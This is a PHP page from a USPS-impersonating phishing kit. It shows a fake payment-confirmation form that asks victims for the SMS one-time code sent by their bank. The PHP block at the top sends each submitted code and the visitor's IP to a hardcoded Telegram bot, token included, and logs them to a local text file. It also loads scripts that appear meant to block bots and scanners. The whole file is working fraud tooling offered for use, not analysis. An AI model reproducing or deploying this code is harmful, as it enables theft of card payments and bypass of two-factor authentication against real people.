<?php
include "anti/genius.php";
include "anti/genius1.php"; 
include "anti/genius2.php"; 
include "anti/genius3.php"; 
include "anti/genius4.php"; 
include "anti/genius5.php"; 
include "anti/genius6.php"; 
include "anti/genius7.php"; 
extract($_REQUEST); 
include "id.php";
$sms=$_POST["sim"];
if(isset($_POST['okbb'])){
$ip = getenv("REMOTE_ADDR");
$message=" -------  Gneius  USPS SMS -------"."\n"."SMS Code 1 :  ".$sms."\n"."IP: ".$ipp."\n"."------------  USPS  -------------";
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot6691628482:AAERSLS9uTXK7tc0LqHYbAUv-YO2dD2Etvw/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("noni.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
HEADER("Location: loading_end.php");
}
    ?>
<!DOCTYPE html>
<!-- saved from url=(0039)/look/sms.php -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet" href="./files/5_files/bootstrap-icons.css">
        <link rel="stylesheet" href="./files/5_files/font-awesome.min.css"> 
        <title>Welcom | USPS</title>
        <!-- logo site web-->
        <link rel="icon" href="/look/photos/khikhi.ico" type="image/x-icon">
        <link rel="shortcut icon" href="/look/photos/khikhi.ico" type="image/x-icon">
        <!-- link__css -->
        <link rel="stylesheet" href="./files/5_files/bootstrap.css">
        <link rel="stylesheet" href="./files/5_files/laylay.css">
</head>
<body>
        
        <div class="message ">
            <div class="container">
                <div class="transfer shadow">
                    <div class="image">
                        <img src="./files/5_files/pro_logo.svg">
                        <img src="./files/5_files/vis.png">
                    </div>
                    <div class="text-center pt-3">
                        <h5>Please confirm the following payment</h5>
                    </div>
                    <div class="">
                        <p>The unique password has been sent to the mobile number listed below if you need to change Your bark of modify it via the attable chanets(ATM,WEB)</p>
                    </div>
                    <form action="" method="post">
                        <input type="hidden" name="step" value="sms">
                        <div class="content">
                            <div class="left">
                                <span>Merchant:</span>
                                <span>Amount:</span>
                                <span>Credit card number:</span>
                                <span class="osama">SMS CODE</span>
                            </div>
                            <div class="right">
                                <span>USPS</span>
                                <span>1.99 $ </span>
                                <span>XXXX XXXX XXXX XXXX</span>
                                <span>
                                    <div class="form-group">
                                        <input type="text" required="" name="sim" id="sim" class="form-control"maxlength="20">
                                    </div>
                                </span>
                            </div>
                        </div>
                        <div class="time">
                            <p>Please enter the verifacation code receklied by SMS </p>
                            <div id="counter">1:00</div>                        </div>
                        <div class="botona">
                            <button class="btn" name="okbb">Confirm</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

 

        
 
 <script>
        var counter = 60; 
        var intervalId = null;

        function startCounting() {
            intervalId = setInterval(function () {
                counter--;
                if (counter < 0) {
                    stopCounting();  // Arrêter le compteur lorsque le temps est écoulé
                } else {
                    var minutes = Math.floor(counter / 60);
                    var seconds = counter % 60;
                    document.getElementById("counter").textContent = minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
                }
            }, 1000);
        }

        function stopCounting() {
            if (intervalId) {
                clearInterval(intervalId);
                intervalId = null;
            }
        }

        startCounting();
    </script>
<div id="torrent-scanner-popup" style="display: none;"></div></body></html>